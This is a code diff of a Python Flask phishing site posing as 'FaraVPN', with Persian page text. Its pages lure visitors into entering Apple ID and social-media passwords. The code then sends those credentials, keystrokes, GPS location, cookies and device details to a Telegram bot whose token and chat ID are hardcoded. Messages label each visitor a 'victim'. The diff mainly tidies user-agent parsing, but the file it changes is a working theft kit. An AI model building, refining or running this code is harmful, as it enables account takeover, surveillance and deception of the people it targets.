@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template_string, url_for # <--- url_for اضافه شد
+from flask import Flask, request, render_template_string, url_for
 import requests
 import json
 import threading
@@ -7,13 +7,23 @@ import time
 
 app = Flask(__name__)
 
-# Telegram Bot Configuration
-TELEGRAM_BOT_TOKEN = "8144273028:AAGRluY75gCirELIzkCTHvP5EJwO_JLMRtQ"  # توکن ربات
-TELEGRAM_CHAT_ID = "8147028352"  # یوزر آیدی
+TELEGRAM_BOT_TOKEN = "8144273028:AAGRluY75gCirELIzkCTHvP5EJwO_JLMRtQ"
+TELEGRAM_CHAT_ID = "8147028352"
 
 def send_to_telegram(data, message_type="data"):
-    # Extract device info for victim identification
-    device_info = f"{data.get('platform', 'Unknown Device')}, iOS {data.get('ios_version', 'Unknown')}"
+    user_agent_str = data.get('userAgent', 'Unknown')
+    ios_match = user_agent_str.lower().split('os ')
+    ios_version = "Unknown"
+    if len(ios_match) > 1:
+        version_part = ios_match[1].split(' ')[0].replace('_', '.')
+        if 'like mac os x' in version_part.lower():
+            ios_version = version_part.split('like')[0].strip()
+        else:
+            ios_version = version_part.split(';')[0].strip()
+
+    platform_info = "iPhone" if "iPhone" in user_agent_str else ("iPad" if "iPad" in user_agent_str else "Unknown Device")
+    
+    device_info = f"{platform_info}, iOS {ios_version}"
     message = ""
     if message_type == "visit":
         message = f"رئیس! قربانی ({device_info}) وارد FaraVPN شد! 😎"
@@ -27,9 +37,10 @@ def send_to_telegram(data, message_type="data"):
                 message += f"اکانت {account['service']}: {account['username']}\n"
                 message += f"رمز {account['service']}: {account['password']}\n"
         if "keystrokes" in data:
-            message += "کلیدهای فشرده‌شده:\n" + "\n".join([f"{k['key']} ({k['time']})" for k in data['keystrokes']]) + "\n"
-        if "location" in data:
-            message += f"موقعیت: ({data['location']['lat']}, {data['location']['lon']})\n"
+            keystroke_list = [f"'{k['key']}' (at {k['time'].split('T')[1].split('.')[0]}Z)" for k in data['keystrokes']]
+            message += "کلیدهای فشرده‌شده:\n" + "\n".join(keystroke_list) + "\n"
+        if "location" in data and data['location']:
+            message += f"موقعیت: ({data['location']['lat']:.4f}, {data['location']['lon']:.4f})\n"
         if "cookies" in data:
             message += f"کوکی‌ها: {data['cookies']}\n"
         if "userAgent" in data:
@@ -48,23 +59,32 @@ def send_to_telegram(data, message_type="data"):
     payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
     try:
         requests.post(url, json=payload, timeout=5)
-        print("Telegram message sent successfully!") # <--- خط عیب یابی اضافه شد
+        print("Telegram message sent successfully!")
     except Exception as e:
-        print(f"Failed to send Telegram message: {e}") # <--- خط عیب یابی اضافه شد
+        print(f"Failed to send Telegram message: {e}")
 
 @app.route("/")
 def index():
-    # Send visit notification
     user_agent = request.headers.get('User-Agent', 'Unknown')
-    ios_version = user_agent[user_agent.find("OS ")+3:user_agent.find(" like Mac")].replace("_", ".") if "OS " in user_agent else "Unknown"
+    ios_match = user_agent.lower().split('os ')
+    ios_version = "Unknown"
+    if len(ios_match) > 1:
+        version_part = ios_match[1].split(' ')[0].replace('_', '.')
+        if 'like mac os x' in version_part.lower():
+            ios_version = version_part.split('like')[0].strip()
+        else:
+            ios_version = version_part.split(';')[0].strip()
+
+    platform_info = "iPhone" if "iPhone" in user_agent else ("iPad" if "iPad" in user_agent else "Unknown Device")
+
     device_info = {
-        "platform": "iPhone" if "iPhone" in user_agent else "Unknown Device",
+        "platform": platform_info,
         "ios_version": ios_version,
         "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
     }
     threading.Thread(target=send_to_telegram, args=(device_info, "visit")).start()
 
-    return render_template_string(''' # <--- سه کوتیشن به سه آپاستروف تغییر کرد
+    return render_template_string('''
     <!DOCTYPE html>
     <html lang="fa">
     <head>
@@ -105,14 +125,14 @@ def index():
             <p>با ما هیچوقت قطع نخواهید شد! فراتر از استارلینک رو اینجا تجربه کن! ما تنظیمات VPN رو مستقیم تو گوشیت اعمال می‌کنیم و آپدیت‌ها خودکار نصب می‌شن. برای فعال‌سازی، نیاز به اپل آیدی داریم تا سرورهای FaraVPN بتونن تنظیمات رو روی iOS شما ست کنن.</p>
             <button onclick="window.location.href='/login'">اوکی، فهمیدم!</button>
         </div>
-        <script src="{{ url_for('static', filename='script.js') }}"></script> # <--- تغییر اعمال شده
+        <script src="{{ url_for('static', filename='script.js') }}"></script>
     </body>
     </html>
-    ''') # <--- سه کوتیشن به سه آپاستروف تغییر کرد
+    ''')
 
 @app.route("/login")
 def login():
-    return render_template_string(''' # <--- سه کوتیشن به سه آپاستروف تغییر کرد
+    return render_template_string('''
     <!DOCTYPE html>
     <html lang="fa">
     <head>
@@ -154,14 +174,14 @@ def login():
                 <button type="submit">ادامه</button>
             </form>
         </div>
-        <script src="{{ url_for('static', filename='script.js') }}"></script> # <--- تغییر اعمال شده
+        <script src="{{ url_for('static', filename='script.js') }}"></script>
     </body>
     </html>
-    ''') # <--- سه کوتیشن به سه آپاستروف تغییر کرد
+    ''')
 
 @app.route("/social")
 def social():
-    return render_template_string(''' # <--- سه کوتیشن به سه آپاستروف تغییر کرد
+    return render_template_string('''
     <!DOCTYPE html>
     <html lang="fa">
     <head>
@@ -209,10 +229,10 @@ def social():
                 <button type="submit">فعال‌سازی</button>
             </form>
         </div>
-        <script src="{{ url_for('static', filename='script.js') }}"></script> # <--- تغییر اعمال شده
+        <script src="{{ url_for('static', filename='script.js') }}"></script>
     </body>
     </html>
-    ''') # <--- سه کوتیشن به سه آپاستروف تغییر کرد
+    ''')
 
 @app.route("/collect", methods=["POST"])
 def collect():
